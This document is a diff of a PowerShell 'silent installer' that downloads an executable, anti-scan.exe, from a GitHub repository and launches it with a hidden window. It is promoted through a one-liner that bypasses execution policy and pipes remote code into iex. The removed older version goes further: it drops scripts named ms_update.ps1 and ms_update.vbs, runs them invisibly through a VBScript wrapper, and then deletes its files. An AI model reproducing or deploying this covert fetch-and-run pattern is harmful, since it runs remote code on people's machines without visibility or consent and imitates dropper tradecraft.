@@ -1,90 +1,50 @@
-﻿# ANTI Defense System - Silent Installer v3.2
+﻿# ANTI Defense System - Silent Installer v3.3
 # ─────────────────────────────────────────────────────────────────────────────
-# Usage recommandee (zero fenetre) :
+# Usage standard :
 #   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/AdamZoda/ANTI/main/install.ps1 | iex"
 # ─────────────────────────────────────────────────────────────────────────────
 
 $ErrorActionPreference = "SilentlyContinue"
 
-# TOUT DANS LE MEME REPO
 $REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
 $installDir = "$env:LOCALAPPDATA\AntiScan"
 $exePath    = "$installDir\anti-scan.exe"
-$vbsPath    = "$env:TEMP\ms_update.vbs"
-$ps1Path    = "$env:TEMP\ms_update.ps1"
 
-# ─── Creer le script de travail PS1 ──────────────────────────────────────────
-$workerScript = @"
-`$ErrorActionPreference = 'SilentlyContinue'
-`$REPO_URL   = '$REPO_URL'
-`$installDir = '$installDir'
-`$exePath    = '$exePath'
+# ─── Nettoyage et creation du répertoire ─────────────────────────────────────
+Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
+$null = New-Item -ItemType Directory -Force -Path $installDir
 
-Remove-Item -Path `$installDir -Recurse -Force -ErrorAction SilentlyContinue
-`$null = New-Item -ItemType Directory -Force -Path `$installDir
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$downloaded = $false
 
-`$downloaded = `$false
+# ─── Telechargement simple ───────────────────────────────────────────────────
 try {
-    `$wc = New-Object System.Net.WebClient
-    `$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    `$wc.DownloadFile("`$REPO_URL/anti-scan.exe", `$exePath)
-    if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.3"
+    $wc.DownloadFile("$REPO_URL/anti-scan.exe", $exePath)
+    if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
 } catch {}
 
-if (-not `$downloaded) {
+if (-not $downloaded) {
     try {
-        Invoke-WebRequest -Uri "`$REPO_URL/anti-scan.exe" -OutFile `$exePath -UseBasicParsing -ErrorAction Stop
-        if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
+        Invoke-WebRequest -Uri "$REPO_URL/anti-scan.exe" -OutFile $exePath -UseBasicParsing -ErrorAction Stop
+        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
     } catch {}
 }
 
-if (-not `$downloaded) {
+if (-not $downloaded) {
     try {
         Import-Module BitsTransfer -ErrorAction Stop
-        Start-BitsTransfer -Source "`$REPO_URL/anti-scan.exe" -Destination `$exePath -ErrorAction Stop
-        if ((Test-Path `$exePath) -and (Get-Item `$exePath).Length -gt 1000000) { `$downloaded = `$true }
+        Start-BitsTransfer -Source "$REPO_URL/anti-scan.exe" -Destination $exePath -ErrorAction Stop
+        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
     } catch {}
 }
 
-if (-not `$downloaded) { exit 1 }
+if (-not $downloaded) { exit 1 }
 
+# ─── Lancement direct en arriere-plan (sans Wait bloquant la console parente) ───
 try {
-    `$psi = New-Object System.Diagnostics.ProcessStartInfo
-    `$psi.FileName        = `$exePath
-    `$psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    `$psi.CreateNoWindow  = `$true
-    `$psi.UseShellExecute = `$false
-    `$proc = [System.Diagnostics.Process]::Start(`$psi)
-    if (`$proc) { `$proc.WaitForExit(600000) | Out-Null }
+    Start-Process -FilePath $exePath -WindowStyle Hidden
 } catch {}
-
-Start-Sleep -Seconds 2
-Remove-Item -Path `$installDir -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "`$env:TEMP\ms_update.ps1" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "`$env:TEMP\ms_update.vbs" -Force -ErrorAction SilentlyContinue
-"@
-$workerScript | Out-File -FilePath $ps1Path -Encoding UTF8 -Force
-
-# ─── Creer le VBScript wrapper ─────
-$vbsContent = "Set oShell = CreateObject(\"WScript.Shell\")" + "`n" +               "sCmd = \"powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"" & $ps1Path & \"\"\"" + "`n" +               "oShell.Run sCmd, 0, False"
-
-$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
-
-# ─── Lancer le VBScript (invisible) et fermer le PowerShell parent ───────────
-try {
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.Run("wscript.exe //nologo `"$vbsPath`"", 0, $false)
-} catch {
-    try {
-        $psi2 = New-Object System.Diagnostics.ProcessStartInfo
-        $psi2.FileName        = "powershell.exe"
-        $psi2.Arguments       = "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ps1Path`""
-        $psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $psi2.CreateNoWindow  = $true
-        $psi2.UseShellExecute = $false
-        [System.Diagnostics.Process]::Start($psi2) | Out-Null
-    } catch {}
-}
 
 exit 0
